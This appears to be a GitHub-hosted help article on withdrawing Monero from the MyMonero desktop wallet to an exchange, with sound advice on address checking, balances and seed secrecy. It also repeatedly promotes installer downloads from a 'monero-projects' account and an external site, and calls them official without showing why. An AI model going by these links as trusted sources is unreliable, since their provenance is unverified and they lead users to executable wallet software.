<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">Withdraw XMR From MyMonero to an Exchange</h1>
<p align="center">How to send Monero safely from the desktop wallet to an exchange deposit address.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
You can send XMR from the MyMonero desktop wallet to an exchange by creating a normal transaction to the deposit address shown by that exchange. Confirm the address, network, and amount carefully; a transfer to the wrong destination may not be recoverable.


Prefer reading on the web? The [MyMonero send withdraw page](https://mymonero.info/mymonero-send-withdraw) on mymonero.info explains the same problem, the [MyMonero download page](https://mymonero.info/github/monero-projects) lists the safe sources, and [MyMonero safety facts](https://mymonero.info/is-mymonero-safe) covers the common questions.

## You'll see this if
- You want to move XMR from your MyMonero wallet to an exchange account.
- The exchange asks you to provide a deposit address or payment ID instructions.
- You are unsure why the wallet shows less as available than the total balance.
- You are deciding whether to continue using the desktop app or restore your wallet elsewhere.

## Why it happens
An exchange deposit is an outgoing Monero transaction. MyMonero does not connect your wallet balance to the exchange automatically: you copy a receiving address supplied inside your exchange account, then create a send transaction from the wallet. The exchange controls the destination address and any deposit requirements, so check its own current instructions before sending. Do not assume instructions for another asset or network apply to XMR.

The displayed total can include funds that are not yet spendable. Recent incoming funds may still be pending or locked while the network processes them. The wallet may also need to scan activity before its balance is current. For context on the difference, see [MyMonero locked and pending balance](./mymonero-locked-pending-balance.md), [why MyMonero spendable balance is low](./mymonero-spendable-balance-low.md), and [a MyMonero transaction not showing](./mymonero-transaction-not-showing.md).

MyMonero desktop's final release is v1.3.3, available for Windows as an .exe, macOS as a .dmg, and Linux as a .zip on the [GitHub release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3). The old app still opens wallets and sends XMR, but is no longer maintained and receives no new features or security updates. MyMonero hosted servers and web wallet login stopped. If you do not want to keep using the desktop app, one alternative is to restore your seed in Cake Wallet, available on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. Compare the options in [MyMonero migration choices](./mymonero-to-cake-wallet-migration.md).

---
## Fix
1. **Check the exchange deposit instructions.** Sign in to the exchange using your usual route, open its XMR deposit page, and make sure the asset is Monero (XMR). Read any destination tag, minimum deposit, or confirmation requirements shown there. If the exchange does not currently accept XMR deposits, do not send.
2. **Create or confirm the destination.** Use the address displayed by the exchange for your own account. Copy it using the exchange interface, then compare the beginning and ending characters after pasting into MyMonero. Be alert for clipboard substitution: if the pasted address differs from the one you copied, stop and investigate. Never use an address from a message or an unsolicited support contact.
3. **Open your wallet locally.** Launch MyMonero desktop and select the wallet that contains the XMR. Check that it is the wallet you intend to use. If your wallet is not appearing or your credentials are unclear, consult restore a MyMonero wallet before sending anything.
4. **Check spendable funds.** Review the spendable amount, not only the total balance. Leave enough available to cover the transaction fee shown by the wallet. Do not try to work around a locked balance; wait for the wallet and network to make funds available, or diagnose a scan issue using MyMonero balance shows zero.
5. **Enter the transfer details.** Paste the exchange address into the recipient field and enter the amount requested. Follow the exchange's current deposit directions for any additional information. Do not invent or reuse a payment detail from an old transaction. If the wallet offers a final review, use it to inspect the recipient, amount, and fee.
6. **Verify before sending.** Compare the address in the wallet with the exchange's deposit address, character by character where practical. Confirm the amount and that you are sending XMR. A small test transfer can help you confirm the exchange process, but it may be subject to minimum deposit requirements and additional fees; check first.
7. **Send once and retain the transaction details.** Submit the transaction only after reviewing it. Keep the transaction identifier privately for your own records. Do not post it alongside personal information or share your seed, private keys, or wallet password with anyone offering to help.
8. **Wait for the exchange to credit it.** Wallet confirmation and exchange crediting are different steps. Check the transaction status in MyMonero and the deposit status in your exchange account. Allow time for the network and the exchange's stated confirmation policy.

> [!WARNING]
> Treat your seed as the keys to your funds. No legitimate helper needs you to disclose it to troubleshoot a withdrawal. Ignore requests to enter it into a website, chat, or form.

---
## If that did not work
If the transaction is absent from wallet history, first confirm that you completed the send flow and that the wallet has scanned recent activity. Use MyMonero not syncing guidance if the view appears stale. If the transaction is visible but not credited, compare its status with the exchange's deposit instructions and contact the exchange through its official account support route. Do not send a second payment just because the first has not appeared.

If the wallet reports insufficient spendable funds, check for pending incoming funds and leave room for the displayed fee. A total balance is not necessarily the amount available to send. If the exchange address was entered incorrectly, contact the exchange through its official support channel; do not assume the transaction can be reversed. For safer handling of a full move, read sweeping funds to a new wallet.

When the desktop application itself will not open, check the MyMonero desktop project for the published release information. Avoid downloads from search ads, unsolicited messages, or unofficial mirrors. For installation details, see install MyMonero on Windows or install MyMonero on macOS.

## Prevention
- Copy deposit details from the exchange account you control, and verify them in the wallet before every send.
- Confirm XMR is the selected asset and follow the exchange's latest deposit requirements.
- Keep your seed offline in a private, secure place; never share it with support or enter it into an untrusted page.
- Keep a private record of your transaction identifier and the amount, without exposing wallet secrets.
- Plan around pending funds and fees rather than trying repeated transfers.
- Download the desktop app only from the project's GitHub release information and check the file integrity instructions in verify a MyMonero download.

## FAQ
<details><summary>Can I withdraw directly from the MyMonero web wallet?</summary>

MyMonero hosted servers and web wallet login stopped. Use the desktop app if it is already available to you, or restore your seed in Cake Wallet. Be cautious of pages claiming to provide a live MyMonero web login.

</details>

<details><summary>Why can I not send my full balance?</summary>

Some funds may be locked or pending, and the transaction fee also requires spendable funds. Check the available balance and wait for eligible funds to become spendable.

</details>

<details><summary>Should I share my seed with the exchange?</summary>

No. An exchange deposit requires its receiving address, not your seed or private keys. Nobody legitimate should ask you for your seed.

</details>

<details><summary>What if the deposit is delayed?</summary>

Check the transaction status in MyMonero and the exchange's stated confirmation requirements. Contact the exchange using its official support route if it remains uncredited; do not resend without understanding the first transaction's status.

</details>

---

## Download MyMonero

- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [Restore a MyMonero Wallet](./restore-mymonero-wallet.md) | Recover access by restoring a compatible seed in MyMonero desktop or Cake Wallet. |
| [MyMonero Balance Shows Zero](./mymonero-balance-shows-zero.md) | Check wallet selection, scanning, restore height, and connection before concluding funds are missing. |
| [MyMonero Transaction Not Showing](./mymonero-transaction-not-showing.md) | Troubleshoot missing incoming or outgoing activity without exposing wallet secrets. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
